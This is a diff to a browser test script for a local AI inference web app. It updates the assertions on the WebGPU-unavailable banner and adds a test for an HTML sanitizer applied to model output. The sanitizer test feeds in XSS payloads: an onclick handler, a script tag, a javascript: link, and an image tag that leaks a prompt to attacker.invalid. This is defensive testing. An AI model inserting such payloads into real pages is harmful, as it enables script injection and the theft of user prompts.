@@ -113,7 +113,8 @@ function assertBannerContent(i) {
   const t = i.bannerText || "";
   const preview = JSON.stringify(t.replace(/\s+/g, " ").slice(0, 160));
   assert("banner header 'WebGPU not available' present", t.includes("WebGPU not available"), "text=" + preview);
-  assert("banner pitch 'runs entirely' present", t.includes("runs entirely"), "text=" + preview);
+  assert("banner distinguishes local inference from downloads", t.includes("inference runs in your browser") && t.includes("downloads application assets and model files"), "text=" + preview);
+  assert("banner states prompt boundary", t.includes("prompts are not sent to an inference API"), "text=" + preview);
   assert("banner checklist Chrome present", t.includes("Chrome 113") || t.includes("Chrome"), "text=" + preview);
   assert("banner checklist Edge present", t.includes("Edge"), "text=" + preview);
   assert("banner checklist chrome://gpu hint present", t.includes("chrome://gpu"), "text=" + preview);
@@ -165,6 +166,33 @@ async function runPass(label, initScript, assertFn) {
         assertBannerContent(i);
       }
     );
+
+    console.log("Pass C: model HTML sanitizer blocks active and auto-fetching content");
+    {
+      const browser = await chromium.launch({ headless: true, args: LAUNCH_ARGS });
+      try {
+        const page = await browser.newPage();
+        await page.goto(URL, { waitUntil: "load", timeout: 30000 });
+        const sanitized = await page.evaluate(async () => {
+          const { sanitizeModelHtml } = await import("/safe-markdown.js");
+          return sanitizeModelHtml(
+            '<p onclick="alert(1)">ok</p>' +
+            '<img src="https://attacker.invalid/pixel?prompt=secret">' +
+            '<script>alert(1)</script>' +
+            '<a href="javascript:alert(1)">bad</a>' +
+            '<a href="https://example.com/path">good</a>'
+          );
+        });
+        assert("sanitizer preserves safe text", sanitized.includes("<p>ok</p>"), sanitized);
+        assert("sanitizer removes event handlers", !sanitized.includes("onclick"), sanitized);
+        assert("sanitizer removes remote image requests", !sanitized.includes("<img"), sanitized);
+        assert("sanitizer removes scripts", !sanitized.includes("<script"), sanitized);
+        assert("sanitizer removes javascript URLs", !sanitized.includes("javascript:"), sanitized);
+        assert("external links are isolated", /target="_blank"/.test(sanitized) && /noopener noreferrer/.test(sanitized), sanitized);
+      } finally {
+        await browser.close();
+      }
+    }
 
     // A1: navigator.gpu present but requestAdapter() resolves null -> no-adapter branch.
     await runPass(
